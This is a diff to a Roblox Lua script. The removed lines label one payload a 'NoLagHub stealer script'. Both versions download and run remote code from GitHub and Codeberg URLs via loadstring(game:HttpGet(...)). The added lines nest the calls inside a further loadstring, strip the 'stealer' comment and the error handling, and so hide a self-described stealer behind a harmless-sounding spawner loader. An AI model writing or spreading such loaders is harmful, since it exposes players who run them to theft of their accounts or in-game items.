@@ -1,23 +1,5 @@
-
--- Run NoLagHub stealer script
-local success1, err1 = pcall(function()
+loadstring([[
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Petspawner1/Growgarden/refs/heads/main/NoLagHubscript"))()
-end)
-
-if not success1 then
-    warn("[NoLagHubscript] Failed to load:", err1)
-end
-
--- Run Spawner loader
-local success2, err2 = pcall(function()
-    local Spawner = loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
-    if Spawner and typeof(Spawner.Load) == "function" then
-        Spawner.Load()
-    else
-        warn("[Spawner] Load function missing or invalid")
-    end
-end)
-
-if not success2 then
-    warn("[Spawner] Failed to load:", err2)
-end
+    task.wait(1)
+    loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))().Load()
+]])()
